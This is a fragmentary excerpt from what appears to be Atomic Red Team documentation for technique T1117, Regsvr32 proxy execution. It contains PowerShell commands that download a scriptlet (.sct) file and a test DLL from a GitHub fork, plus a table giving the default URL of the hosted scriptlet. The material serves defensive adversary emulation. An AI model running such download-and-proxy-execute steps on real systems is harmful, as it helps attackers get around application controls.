...
Invoke-WebRequest "https://github.com/emrahkaya/atomic-red-team/raw/feature/v6/atomics/T1117/src/RegSvr32.sct" -OutFile "#{filename}"
```
...
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| url | URL to hosted sct file | Url | https://raw.githubusercontent.com/emrahkaya/atomic-red-team/feature/v6/atomics/T1117/src/RegSvr32.sct|
...
Invoke-WebRequest "https://github.com/emrahkaya/atomic-red-team/raw/feature/v6/atomics/T1117/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
```
